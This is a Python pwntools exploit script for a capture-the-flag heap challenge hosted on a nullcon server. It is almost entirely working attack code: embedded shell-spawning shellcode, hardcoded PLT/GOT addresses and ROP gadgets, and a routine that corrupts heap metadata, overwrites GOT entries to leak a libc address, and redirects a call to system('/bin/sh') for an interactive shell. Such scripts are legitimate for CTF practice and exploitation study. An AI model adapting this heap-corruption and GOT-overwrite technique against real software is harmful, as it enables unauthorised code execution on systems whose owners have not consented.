#!/usr/bin/env python

from pwn import *
import sys
import time
import argparse
import string

# ============================================================== #
# ========================== SETTINGS ========================== #
# ============================================================== #

context.arch = 'amd64' # [ amd64 | i386 ]
context.os = 'linux'
context.endian = 'little'
context.word_size = 64 # [ 64 | 32]
# ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
context.log_level = 'INFO'

# ============================================================== #
# ========================== TEMPLATE ========================== #
# ============================================================== #


SHELLCODE64 = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" # 27bytes len
SHELLCODE32 = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" # 23bytes len
WORD32 = 'A'*4    # 32bit
WORD64 = 'X'*8   # 64bit
payload = ''
data = ''

program_name = './challenge'
binary = ELF(program_name)

remote_server = 'pwn2.ctf.nullcon.net'
PORT = 5002

parser = argparse.ArgumentParser(description='Exploit the bins.')
parser.add_argument('--dbg'   , '-d', action="store_true")
parser.add_argument('--remote', '-r', action="store_true")
parser.add_argument('--lib', '-l', action="store_true")
args = parser.parse_args()

if args.remote:
    p = remote(remote_server, PORT)

else:
    # know libc
    if args.lib:
        libc = ELF("libc.so.6") #determin libc-version: ldd ./program_name
        p = process(program_name, env={'LD_PRELOAD' : libc.path})
    # don't know libc
    else:
        p = process(program_name)

if args.dbg:
    gdb.attach(p, '''
    vmmap
    b *main
    ''')

# ============ PLT =========== #

alloc_PLT = 0x4006d0
__gmon_start___PLT = 0x4006c0
puts_PLT = 0x400660
read_PLT = 0x400690
setbuf_PLT = 0x400670
free_PLT = 0x40064c
atoi_PLT = 0x4006e0
exit_PLT = 0x4006f0
printf_PLT = 0x400680
fgets_PLT = 0x4006b0
__libc_start_main_PLT = 0x4006a0

# ============ GOT =========== #

alloc_GOT = 0x602058
exit_GOT = 0x602068
__gmon_start___GOT = 0x602050
puts_GOT = 0x602020
stdout_GOT = 0x602080
read_GOT = 0x602038
stdin_GOT = 0x602088
free_GOT = 0x602018
atoi_GOT = 0x602060
__libc_start_main_GOT = 0x602040
printf_GOT = 0x602030
fgets_GOT = 0x602048
setbuf_GOT = 0x602028

# ============================================================== #
# ====================== GADGETS & MAGIC ======================= #
 # ============================================================== #

pop_rdi = 0x0000000000000b53 # pop rdi; ret; 
pop_rsi = 0x0000000000000b51 # pop rsi; pop r15; ret; 
pop_rbp = 0x0000000000000b4b # pop rbp; pop r12; pop r13; pop r14; pop r15; ret; 
pop_rbp = 0x0000000000000b4f # pop rbp; pop r14; pop r15; ret; 
pop_rbp = 0x0000000000000745 # pop rbp; ret; 
pop_rbp = 0x0000000000000782 # pop rbp; ret; 
pop_rbp = 0x00000000000009cd # pop rbp; ret; 
pop_rbp = 0x00000000000009fb # pop rbp; ret; 
pop_rbp = 0x0000000000000a3d # pop rbp; ret; 
leave = 0x000000000000082e # leave; ret; 
leave = 0x000000000000087a # leave; ret; 
leave = 0x00000000000008ea # leave; ret; 
leave = 0x0000000000000938 # leave; ret; 
leave = 0x000000000000098b # leave; ret; 
leave = 0x0000000000000aee # leave; ret; 

# ============================================================== #
# ====================== USEFUL FUNCTIONS ====================== #
# ============================================================== #

def console_output():
    data = p.recv(2000)
    # print data

def send_data(payload):
    # print '[*] payload'
    p.sendline(payload)

def wait_for_prompt(sentence):
  print r.recvuntil(sentence)

def get_symbols(y):
    x = p32(binary.symbols[y])
    return x
    # Example: read_got = p32(binary.symbols["read"])

def get_libc_offset(x):
    off = libc.symbols[x]
    return off

def search_binsh():
    return libc.search("/bin/sh").next()

def buy(data):
    p.sendline('1')
    p.sendafter('book?',data)

def edit(idx, data):
    p.sendline('3')
    p.sendline(str(idx))
    p.sendafter('book?',data)

# ============================================================== #
# ====================== FLOW OF PROGRAM ======================= #
# ============================================================== #

if __name__ == "__main__":


    name = 'flag.txt'
    p.sendlineafter('name?',name)
    p.recvuntil('Checkout!')

    buy('a'*10)
    print 'a'
    buy('b'*10)
    buy('c'*10)

    payload = p64(0)
    payload += p64(0xf1)
    payload += p64(0x602188)
    payload += p64(0x602190)
    payload += 'A'*0xd0
    payload += p64(0xf0)
    edit(0,payload)

    p.sendline('2')
    p.sendlineafter('return?','1')

    edit(0, 'a'*(8*3)+p64(0x602018) + p64(0) + p64(0x602060)+ p64(0x602060) )
    edit(0, p64(puts_PLT)[:-1])

    
    p.sendline('2')
    p.sendlineafter('return?','2')

    # gdb.attach(p,'''
    # b *0x400A67
    # ''')

    leak = p.recvline()
    leak = p.recvline()
    libc = int(hex(u64(leak.strip().ljust(8,'\x00'))),16)-0x0000000000036e80
    print hex(libc)

    syss = 0x0000000000045390

    edit(3, p64(libc + syss))

    p.sendline('/bin/sh')

    # ============ GDB =========== #
    p.interactive()

# ============================================================== #
# =========================== SKETCH =========================== #
# ============================================================== #
